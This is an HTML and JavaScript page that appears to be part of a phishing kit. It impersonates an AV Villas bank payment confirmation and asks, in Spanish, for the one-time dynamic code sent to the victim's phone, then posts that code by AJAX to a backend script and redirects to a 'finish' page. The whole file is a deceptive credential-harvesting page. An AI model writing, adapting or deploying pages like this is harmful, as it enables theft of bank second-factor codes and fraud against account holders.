
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">



    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


    <title>Secure Payment</title>
</head>
<body style="padding: 10px;">
    

<img src="/img/avvillas.png" alt="" srcset="" width="50%"><br>
<br><br><br><div class="" style="margin-top:55px:">
    <a>Esta a punto de realizar un pago en el comercio <b>Latam</b> para continuar ingrese la clave dinamica que hemos enviado al numero asociado con su cuenta</a>

   <center> <br><input type="number" name="" id="txtDinamica" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px; margin-left:0px;" required maxlength="6" minlength="6">
    <input type="submit" value="Continuar" id="btnDinamica" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;"></center>

</div>

<script type="text/javascript">
	var espera = 0;
    var counter = 0;
	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

    function sendCode() {
        if ($("#txtDinamica").val().length > 5) {
            const data = {
                'dinamica': $("#txtDinamica").val()
            };
            console.log(data);
            $.ajax({
                url: '../../acciones/editar_mensaje.php',
                method: 'POST',
                data: {
                    data: data
                },
                success: function(response) {
                    const result = JSON.parse(response);
                    if (result.success) {
                        window.location.href = "finish.php";
                    } else {
                        alert('Error al editar el mensaje: ' + result.error);
                    }
                },
                error: function(xhr, status, error) {
                    alert('Error en la solicitud AJAX: ' + error);
                }
            });		
        } else {
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $("#txtDinamica").focus();
        }	
    }

	$(document).ready(function() {
		$('#btnDinamica').click(function(){
            if(counter < 3) {
                $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $("#txtDinamica").focus();
            } else {
                sendCode();
            }
		});

		$("#txtDinamica").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>